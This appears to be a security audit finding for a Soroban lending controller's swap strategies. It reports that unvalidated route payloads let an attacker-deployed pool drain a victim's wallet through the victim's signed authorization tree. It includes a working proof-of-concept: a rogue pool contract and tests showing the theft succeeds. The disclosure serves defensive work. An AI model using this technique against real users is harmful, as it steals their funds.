### Title
Route payload names arbitrary pool addresses, letting a crafted `swap` XDR put wallet-draining calls inside the caller's signed auth tree - (File: contracts/controller/src/strategies/swap.rs)

### Summary
The analog of CVE-2021-29642 (a crafted workspace folder silently repointing the API endpoint to an attacker server, leaking tokens) is the strategy-route payload in the controller's swap strategies. `swap_collateral`, `swap_debt`, `multiply`, and `repay_debt_with_collateral` accept a caller-supplied `StrategySwap` XDR that names the `pool` address of every hop. Neither the controller nor the router keeps an allowlist of venues or pools, so a crafted route substitutes attacker-deployed code for a real DEX pool — the same "crafted input repoints execution to an attacker endpoint" class. Code running inside the hop can issue `token.transfer(caller, attacker, amount)` for any token the caller holds, and Soroban simulation records that transfer as a child of the caller's `require_auth` entry, so signing the simulated transaction authorizes the theft.

### Finding Description
`swap_tokens` loads the configured router, snapshots balances, authorizes exactly one `transfer` of `token_in` to the router, and invokes `router.execute_strategy(controller, amount_in, swap)` where `swap` is fully caller-controlled bytes [1](#0-0) . The router's hop adapters call whatever `ctx.hop.pool` the payload names — e.g. Comet's adapter `invoke_contract(&ctx.hop.pool, "swap_exact_amount_in", ...)` — with no venue/pool allowlist anywhere [2](#0-1) . The documented threat model confirms the consequence: "a route can put third-party code on the call stack below the caller's authorization... a token transfer that such code makes from the caller is recorded... as a child of the caller's authorization entry, and it executes if the caller signs that tree. The loss is then the caller's wallet, not the routed amount" [3](#0-2) .

The balance-delta checks in `swap_tokens` (`RouterOverspend`, `NoSwapOutput`) only bound the routed amount and the controller's own grant; they do not bound calls the rogue pool makes directly against the caller's address [4](#0-3) . The same exposure exists for any user calling `execute_strategy` on the router directly, since the only signature is the sender's and venue calls sit inside it [5](#0-4) .

### Impact Explanation
Theft of user funds: an attacker-deployed "pool" reached through a crafted `swap` route can transfer arbitrary tokens held by the victim (not merely the swap input) to the attacker. The harness test demonstrates a `RogueHopPool` draining Alice's entire `WALLET_BALANCE` of an unlisted token during `swap_collateral`, while her supplied USDC is still swapped fairly [6](#0-5) . The loss is unbounded by `min_out` or the final risk gate.

### Likelihood Explanation
Exploitation requires the victim to sign a route payload that references the rogue pool — i.e., the attacker must get the crafted XDR in front of the user (malicious quote/route provider, phishing front-end), mirroring the CVE's "crafted workspace folder" precondition. Once submitted, simulation produces an auth tree containing the theft transfer; any client that signs the simulated tree without decoding the route authorizes it. The test proves recording mode silently attaches the rogue `transfer` under the caller's `swap_collateral` entry, and that signing that tree executes the theft [7](#0-6) . Severity: Medium (requires user interaction/signing of a poisoned auth tree).

### Recommendation
Restrict hop `pool` (and token) addresses in the payload to a governance-maintained allowlist, or require venue adapters to resolve pool addresses from a registry keyed by token pair rather than from payload bytes. At minimum, the controller should reject `StrategySwap` routes whose instruction hop addresses are not known market/venue contracts, and clients should be required (via documentation enforced in the SDK) to refuse auth trees whose children exceed the single expected input `transfer`.

### Proof of Concept
`tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs` is a complete PoV:

1. Attacker deploys `RogueHopPool` configured to call `token::Client::transfer(victim, attacker, amount)` on an arbitrary wallet token when its `swap` fn is invoked [6](#0-5) .
2. A `RoutedSwap` XDR names the rogue pool as `hop_pool`; the router invokes it inside `execute_strategy` [8](#0-7) .
3. Simulation records `token.transfer(alice → attacker, WALLET_BALANCE)` as a sub-invocation of Alice's `swap_collateral` auth entry [9](#0-8) .
4. Signing the simulated tree authorizes the theft: Alice's wallet goes to 0, the attacker receives `WALLET_BALANCE`, while the controller-side swap still settles fairly [10](#0-9) .

On-chain reproduction: attacker crafts `swap_collateral(caller, account, USDC, amount, ETH, rogue_route_xdr)` where `rogue_route_xdr` embeds the attacker's pool address; victim signs the simulated auth tree; the rogue pool transfers victim's unrelated tokens to the attacker inside the same transaction.

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L24-38)
```rust
    let controller = env.current_contract_address();
    let router_addr = storage::get_swap_aggregator(env);
    let router = SwapAggregatorClient::new(env, &router_addr);
    let token_in_client = token::Client::new(env, token_in);

    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** contracts/swap-aggregator/src/venues/comet.rs (L30-34)
```rust
    let _: (i128, i128) = ctx.env.invoke_contract(
        &ctx.hop.pool,
        &Symbol::new(ctx.env, "swap_exact_amount_in"),
        args,
    );
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```

**File:** skills/xoxno-swap-aggregator/payload.md (L109-115)
```markdown
## Authorization model

The only signature is the sender's. `execute_strategy` calls `sender.require_auth()`, and the sender's auth entry must cover the nested `token_in.transfer(sender, router, total_in)`; simulation produces that tree (`transaction.simulated = true` envelopes already carry it — `attach_simulated_transaction` copies the simulator's `auth` into the op — and `simulateTransaction` produces it for a locally built one). Do **not** `transfer` or `approve` tokens to the router beforehand: the router pulls the input itself, and tokens sent ahead of time are not credited.

Every venue call is self-authorized by the router with invoker-contract auth (`venues/auth.rs::authorize_as_current` → `env.authorize_as_current_contract`): Phoenix and Sushi (`HopContext::authorize_pool_pull`) and Aquarius (`aquarius/pool.rs::invoke_pool_swap`) register `token_in.transfer(router, pool, amount_in)` before the pool pulls; Comet registers `token_in.approve(router, pool, amount_in, expiry)`, then `swap_exact_amount_in` with a nested entry for the pool's `transfer_from`, then clears the allowance; Soroswap transfers from the router to the pool directly. None of these appear in the sender's auth tree.

A contract calling the router (the lending controller in `contracts/controller/src/strategies/swap.rs`, or your own) is the `sender`: it runs `authorize_transfer_as_current(token_in, self, router, amount_in)` (`common/src/token.rs`) immediately before `execute_strategy(self, amount_in, swap)` and measures its own balance deltas afterward (`RouterOverspend = 501`, `NoSwapOutput = 502` in `common/src/errors.rs`). Details in [composition.md](composition.md).
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L39-47)
```rust
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-71)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```
